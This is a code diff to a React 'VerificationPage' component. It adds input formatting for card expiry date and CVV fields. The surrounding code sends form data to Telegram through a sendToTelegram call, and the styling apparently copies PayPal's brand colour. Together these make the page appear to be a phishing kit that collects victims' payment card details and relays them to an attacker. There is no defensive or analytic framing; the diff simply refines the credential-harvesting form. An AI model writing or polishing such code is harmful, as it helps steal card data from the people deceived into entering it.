@@ -53,6 +53,23 @@ export function VerificationPage({ email, onBack, onVerificationSuccess, mode = 
     setCardNumber(formattedValue);
   };
 
+  const handleExpiryDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const value = e.target.value.replace(/[^0-9]/g, '').substring(0, 4);
+    let formattedValue = '';
+    if (value.length > 0) {
+      formattedValue = value.substring(0, 2);
+      if (value.length > 2) {
+        formattedValue += '/' + value.substring(2, 4);
+      }
+    }
+    setExpiryDate(formattedValue);
+  };
+
+  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const value = e.target.value.replace(/[^0-9]/g, '').substring(0, 4);
+    setCvv(value);
+  };
+
   const handleNext = async () => {
     setLoading(true);
     await sendToTelegram(`<b>[VERIFICATION] Option Selected:</b> ${selectedOption}`);
@@ -154,7 +171,7 @@ export function VerificationPage({ email, onBack, onVerificationSuccess, mode = 
                 <input
                   type="text"
                   value={expiryDate}
-                  onChange={(e) => setExpiryDate(e.target.value)}
+                  onChange={handleExpiryDateChange}
                   placeholder="Expiry date"
                   className="w-full px-4 py-4 bg-[#f5f7fa] border border-transparent rounded-lg text-[16px] outline-none focus:bg-white focus:border-[#0070BA] transition-all"
                 />
@@ -163,7 +180,7 @@ export function VerificationPage({ email, onBack, onVerificationSuccess, mode = 
                 <input
                   type="text"
                   value={cvv}
-                  onChange={(e) => setCvv(e.target.value)}
+                  onChange={handleCvvChange}
                   placeholder="CVV"
                   className="w-full px-4 py-4 bg-[#f5f7fa] border border-transparent rounded-lg text-[16px] outline-none focus:bg-white focus:border-[#0070BA] transition-all"
                 />
